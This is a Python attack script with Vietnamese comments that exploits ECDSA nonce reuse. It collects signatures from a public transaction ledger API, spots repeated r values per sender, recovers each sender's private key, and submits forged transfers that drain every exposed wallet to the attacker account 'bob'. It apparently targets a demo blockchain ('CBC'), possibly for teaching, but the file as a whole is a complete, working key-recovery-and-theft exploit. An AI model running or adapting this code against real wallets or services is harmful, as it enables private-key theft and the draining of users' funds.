"""TẤN CÔNG 1 — NONCE REUSE (qua HTTP, dùng API công khai thật).

Ví hỏng RNG nên nhiều giao dịch lặp lại nonce. Từ sổ cái công khai
(/api/transactions), phát hiện các chữ ký cùng r của cùng người gửi -> khôi phục
KHÓA RIÊNG -> ký giao dịch rút sạch tiền về 'bob' qua /api/tx/submit.

    python attack_nonce_reuse.py
"""
import time

from common import (get, post, tx_bytes, hash_to_int, inverse_mod,
                    sign_transfer, curve_from_info, money)

ATTACKER = "bob"


def recover_key(n, t1, t2):
    r = int(t1["r"]); s1 = int(t1["s"]); s2 = int(t2["s"])
    z1 = hash_to_int(tx_bytes(t1), n); z2 = hash_to_int(tx_bytes(t2), n)
    if (s1 - s2) % n == 0:
        return None
    k = (z1 - z2) * inverse_mod((s1 - s2) % n, n) % n
    return (s1 * k - z1) * inverse_mod(r, n) % n


def main():
    print("=== Tấn công 1: NONCE REUSE ===")
    _, txs = get("/api/transactions")
    _, state = get("/api/state")
    _, accounts = get("/api/accounts")
    balance = {a["user"]: a["balance"] for a in state["accounts"]}
    pub = {a["user"]: (int(a["pub"]["x"]), int(a["pub"]["y"])) for a in accounts}
    curves = {a["user"]: curve_from_info(a["curve"]) for a in accounts}
    print(f"Thu thập {len(txs)} chữ ký từ sổ cái công khai.")

    # Nhóm chữ ký theo người gửi, tìm nonce trùng (cùng r) rồi khôi phục khóa.
    by_sender = {}
    for t in txs:
        by_sender.setdefault(t["from"], []).append(t)
    keys = {}
    for u, lst in by_sender.items():
        if u == ATTACKER:
            continue
        cu = curves[u]
        seen = {}
        for t in lst:
            if t["r"] in seen:
                d = recover_key(cu.n, seen[t["r"]], t)
                if d and cu.mul(d, cu.G) == cu.point(*pub[u]):
                    keys[u] = (d, cu)
                    print(f"Phát hiện nonce trùng ở '{u}' -> khôi phục được khóa riêng.")
                break
            seen[t["r"]] = t
    if not keys:
        print("Không tìm thấy ví nào lặp nonce.")
        return

    # Ký giao dịch giả rút sạch từng ví bị lộ khóa về 'bob'.
    stolen = 0
    nid = state["next_id"]
    for u, (d, cu) in keys.items():
        amt = balance.get(u, 0)
        if amt <= 0:
            continue
        tx, r, s = sign_transfer(cu, d, u, ATTACKER, amt, nid)
        _, res = post("/api/tx/submit", {**tx, "r": str(r), "s": str(s)})
        if isinstance(res, dict) and res.get("ok"):
            stolen += amt
            nid += 1
            print(f"Rút {money(amt)} CBC từ '{u}' về '{ATTACKER}'.")
        else:
            print(f"Thất bại khi rút từ '{u}': {res.get('message') if isinstance(res, dict) else res}")
        time.sleep(0.2)

    print(f"Tổng cộng: chuyển {money(stolen)} CBC về '{ATTACKER}' từ {len(keys)} ví.")


if __name__ == "__main__":
    main()
